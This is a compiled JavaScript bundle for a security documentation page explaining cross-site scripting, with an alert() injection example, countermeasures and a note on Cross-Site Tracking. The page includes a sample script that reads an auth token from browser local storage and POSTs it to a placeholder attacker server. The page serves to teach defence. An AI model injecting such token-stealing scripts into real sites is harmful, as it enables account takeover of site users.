"use strict";
(self.webpackChunkdocs = self.webpackChunkdocs || []).push([
  [6433],
  {
    1978: (e, t, s) => {
      s.r(t),
        s.d(t, {
          assets: () => u,
          contentTitle: () => l,
          default: () => m,
          frontMatter: () => o,
          metadata: () => c,
          toc: () => p,
        });
      var a = s(7462),
        n = s(3366),
        r = (s(7294), s(3905)),
        i = (s(828), ["components"]),
        o = {},
        l = "XSS",
        c = {
          unversionedId: "security/vulnerabilities/xss",
          id: "security/vulnerabilities/xss",
          title: "XSS",
          description:
            "Cross site scripting (XSS) is an attack where one runs a script",
          source: "@site/docs/security/vulnerabilities/xss.md",
          sourceDirName: "security/vulnerabilities",
          slug: "/security/vulnerabilities/xss",
          permalink: "/docs/security/vulnerabilities/xss",
          draft: !1,
          tags: [],
          version: "current",
          frontMatter: {},
          sidebar: "tutorialSidebar",
          previous: {
            title: "SQL Injection",
            permalink: "/docs/security/vulnerabilities/sqli",
          },
          next: {
            title: "XML External Entity",
            permalink: "/docs/security/vulnerabilities/xxe",
          },
        },
        u = {},
        p = [
          { value: "Example", id: "example", level: 2 },
          {
            value: "Accessing local storage",
            id: "accessing-local-storage",
            level: 3,
          },
          { value: "Countermeasures", id: "countermeasures", level: 2 },
          { value: "XST", id: "xst", level: 2 },
        ],
        d = { toc: p };
      function m(e) {
        var t = e.components,
          s = (0, n.Z)(e, i);
        return (0, r.kt)(
          "wrapper",
          (0, a.Z)({}, d, s, { components: t, mdxType: "MDXLayout" }),
          (0, r.kt)("h1", { id: "xss" }, "XSS"),
          (0, r.kt)(
            "p",
            null,
            (0, r.kt)("strong", { parentName: "p" }, "Cross site scripting"),
            " (",
            (0, r.kt)("strong", { parentName: "p" }, "XSS"),
            ") is an attack where one runs a script\n(typically JavaScript) in another user's browser. This can happen if user inputs\nare not correctly sanitized and then displayed back to users. It can be used for"
          ),
          (0, r.kt)(
            "ul",
            null,
            (0, r.kt)(
              "li",
              { parentName: "ul" },
              "stealing stored data in browser local storage"
            ),
            (0, r.kt)(
              "li",
              { parentName: "ul" },
              "steal cookies (unless they are server-side read-only)"
            ),
            (0, r.kt)(
              "li",
              { parentName: "ul" },
              "modify DOM and trigger DOM events"
            ),
            (0, r.kt)(
              "li",
              { parentName: "ul" },
              "send requests (especially dangerous if cookie-based authentication is used)"
            ),
            (0, r.kt)("li", { parentName: "ul" }, "keylogger")
          ),
          (0, r.kt)("h2", { id: "example" }, "Example"),
          (0, r.kt)(
            "p",
            null,
            "Assume we have a social media site where users can post comments. The comments\nare rendered server side using a template language (although it is as much of a\nvulnerability for client-side rendering)"
          ),
          (0, r.kt)(
            "pre",
            null,
            (0, r.kt)(
              "code",
              { parentName: "pre", className: "language-html" },
              "<div>\n  <p>{comment}</p>\n</div>\n"
            )
          ),
          (0, r.kt)(
            "p",
            null,
            "A malicious user posts a comment containing ",
            (0, r.kt)(
              "inlineCode",
              { parentName: "p" },
              '<script>alert("XSS!")</script>'
            ),
            ".\nWhen any user attempt to see this comment, the HTML renders as below which\nexecutes the malicious script."
          ),
          (0, r.kt)(
            "pre",
            null,
            (0, r.kt)(
              "code",
              { parentName: "pre", className: "language-html" },
              '<div>\n  <p>\n    <script>\n      alert("XSS");\n    </script>\n  </p>\n</div>\n'
            )
          ),
          (0, r.kt)(
            "h3",
            { id: "accessing-local-storage" },
            "Accessing local storage"
          ),
          (0, r.kt)(
            "p",
            null,
            "Assume an attacker knows an application is vulnerable to XSS. On further\ninvestigation, one can also see that it stores authentication tokens in the\nbrowser local storage as ",
            (0, r.kt)(
              "a",
              { parentName: "p", href: "/docs/programming/data_formats/json" },
              "JSON"
            ),
            " under\nthe key ",
            (0, r.kt)("inlineCode", { parentName: "p" }, "persist:root"),
            ". Then an attack to send user tokens to a malicious server\nwould be:"
          ),
          (0, r.kt)(
            "pre",
            null,
            (0, r.kt)(
              "code",
              { parentName: "pre", className: "language-html" },
              '<script>\n  {\n    const root = window.localStorage["persist:root"];\n    const auth = JSON.parse(root).auth;\n\n    const url = "my.evil.server:5001";\n    window.fetch(url, { method: "POST", body: auth });\n  }\n</script>\n'
            )
          ),
          (0, r.kt)("h2", { id: "countermeasures" }, "Countermeasures"),
          (0, r.kt)(
            "p",
            null,
            "The best protection against XSS is to make sure all user input is sanitized and\nthat no vulnerable data is stored in local storage or browser readable cookies."
          ),
          (0, r.kt)("p", null, "Avoid rendering custom HTML content."),
          (0, r.kt)("h2", { id: "xst" }, "XST"),
          (0, r.kt)(
            "p",
            null,
            (0, r.kt)("strong", { parentName: "p" }, "Cross-Site Tracking"),
            " (",
            (0, r.kt)("strong", { parentName: "p" }, "XST"),
            ") is where one uses the HTTP Track method to\nbypass the ",
            (0, r.kt)("inlineCode", { parentName: "p" }, "httpOnly"),
            " attribute in a cookie. To protect against XST, make sure\nTrack requests are disabled (especially from JavaScript)."
          )
        );
      }
      m.isMDXComponent = !0;
    },
  },
]);
